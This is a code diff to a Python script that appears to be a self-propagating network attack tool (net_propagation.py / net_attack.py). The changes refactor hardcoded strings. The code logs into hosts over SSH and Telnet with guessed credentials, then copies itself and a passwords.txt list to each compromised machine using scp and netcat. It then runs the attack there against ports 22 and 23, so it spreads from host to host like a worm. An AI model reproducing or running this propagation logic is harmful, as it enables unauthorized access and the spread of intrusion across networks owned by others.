@@ -136,7 +136,7 @@ def check_over_ssh(ip, port, username, password):
                        username=str(username), password=str(password))
         client.exec_command(strings.touch_file(os.path.basename(__file__)))
         if str(client.exec_command
-                   (strings.cat_file(os.path.basename(__file__)))
+                (strings.cat_file(os.path.basename(__file__)))
                [1]).__len__() < 1:
             client.close()
             return True
@@ -453,20 +453,24 @@ def propagate_script(ip, port, login_string):
                 # TODO: Need feedback from the end user, should be worked into
                 #  the UI itself.
                 print(strings.RSA_AND_PASSWORD)
-                os.system("scp -P " + str(port) + " net_propagation.py "
-                          + login_string_split[0] + "@" + ip + ":~/")
+                os.system(strings.scp_command_string(port,
+                                                     login_string_split[0],
+                                                     ip,
+                                                     os.path
+                                                     .basename(__file__)))
                 print(strings.PLEASE_TYPE_PASSWORD_AGAIN)
-                os.system("scp -P " + str(port) + " passwords.txt "
-                          + login_string_split[0] + "@" + ip + ":~/")
+                os.system(strings.scp_command_string(port,
+                                                     login_string_split[0],
+                                                     ip,
+                                                     strings.PASSWORDS_FILE))
                 client = SSHClient()
                 try:
                     client.set_missing_host_key_policy(RejectPolicy)
                     client.connect(hostname=str(ip), port=int(port),
                                    username=str(login_string_split[0]),
                                    password=str(login_string_split[1]))
-                    client.exec_command("net_attack.py -L -p 22,23 -u "
-                                        + login_string_split[0] + " -f"
-                                        + " passwords.txt -P")
+                    client.exec_command(strings.ssh_run_script_command(
+                        os.path.basename(__file__), login_string_split[0]))
                     client.close()
                     return True
 
@@ -474,20 +478,24 @@ def propagate_script(ip, port, login_string):
                     client.close()
                     return False
             tel = Telnet(host=ip, port=port, timeout=2)
-            tel.read_until("login:".encode("ascii"))
-            tel.write((str(login_string_split[0]) + "\n").encode("ascii"))
-            tel.read_until("Password:".encode("ascii"))
-            tel.write((str(login_string_split[1]) + "\n").encode("ascii"))
+            tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
+            tel.write((str(login_string_split[0]) + strings
+                       .RETURN_OR_NEWLINE).encode(
+                strings.ENCODE_ASCII))
+            tel.read_until(strings.PASSWORD_PROMPT.encode(
+                strings.ENCODE_ASCII))
+            tel.write((str(login_string_split[1]) +
+                       strings.RETURN_OR_NEWLINE).encode(strings.ENCODE_ASCII))
             tel.write(("nc -l -p " + str(port)
-                       + " > net_attack.py").encode("ascii"))
+                       + " > net_attack.py").encode(strings.ENCODE_ASCII))
             os.system(("nc -w 3 " + str(ip) + " " + str(port)
-                       + " < net_attack.py").encode("ascii"))
+                       + " < net_attack.py").encode(strings.ENCODE_ASCII))
             tel.write(("nc -l -p " + str(port)
-                       + " > passwords.txt").encode("ascii"))
+                       + " > passwords.txt").encode(strings.ENCODE_ASCII))
             os.system(("nc -w 3 " + str(ip) + " " + str(port)
-                       + " < passwords.txt").encode("ascii"))
+                       + " < passwords.txt").encode(strings.ENCODE_ASCII))
             tel.write(("net_attack.py -L -p 22,23 -u " + login_string_split[0]
-                       + " -f passwords.txt -P").encode("ascii"))
+                       + " -f passwords.txt -P").encode(strings.ENCODE_ASCII))
             return True
         else:
             print("net_attack.py is already on host: " + str(ip))
